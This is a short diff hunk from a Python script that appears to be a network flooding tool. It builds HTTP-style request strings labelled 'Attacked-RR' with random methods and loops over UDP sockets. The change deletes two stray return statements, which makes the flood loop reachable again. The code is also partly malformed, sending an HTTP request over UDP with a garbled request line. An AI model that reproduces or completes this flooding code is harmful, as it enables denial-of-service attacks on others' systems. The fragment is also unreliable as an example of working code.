@@ -400,8 +400,6 @@ def start2():
   get_rand = random.choice(['GET','POST',"HEAD"])
   get_host = "GET /Attacked-RR/1.1\r\nHost: "  + "\r\n"
   request = get_host + acceptref + agents + connect + connection + get_rand + "\r\n"
-  return byte1
-  return byte2
   while True:
         try:
           s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
